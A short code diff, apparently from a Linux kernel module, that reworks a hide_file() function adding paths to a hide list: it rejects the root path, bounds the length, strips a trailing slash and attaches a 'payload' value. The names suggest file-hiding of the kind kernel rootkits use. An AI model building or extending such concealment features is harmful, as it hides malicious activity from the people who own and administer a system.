@@ -22,10 +22,24 @@ void hide_exit(void) {
     ulist_clear(&hide_list);
 }
 
-int hide_file(const char *path) {
+int hide_file(const char *path)
+{
     int ret;
+    char modpath[256];
 
-    ret = ulist_add(&hide_list, path, 0, NULL);
+    if (strcmp(path, "/") == 0)
+        return -EINVAL;
+
+    if (strlen(path) >= sizeof(modpath))
+        return -ENAMETOOLONG;
+    strscpy(modpath, path, sizeof(modpath));
+
+    size_t len = strlen(modpath);
+    if (len > 1 && modpath[len - 1] == '/') {
+        modpath[len - 1] = '\0';
+    }
+
+    ret = ulist_add(&hide_list, modpath, 0, payload);
     if (ret < 0)
         return ret;
 
